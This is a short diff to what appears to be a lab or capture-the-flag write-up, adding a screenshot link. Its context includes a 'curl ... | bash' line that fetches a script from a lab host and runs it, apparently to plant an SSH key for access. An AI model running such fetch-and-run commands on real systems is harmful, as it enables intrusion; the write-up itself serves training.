@@ -378,6 +378,8 @@ curl -sk -v  https://10.10.168.230/toto/tata/enroll.sh | bash
 
 And it works, now test by connecting with the ssh key on ```intra.control.vl```
 
+![alt text](../assets/image_control/before_last.png)
+
 Ok nice, just create ```/toto/tata/enroll.sh```
 
 ```bash
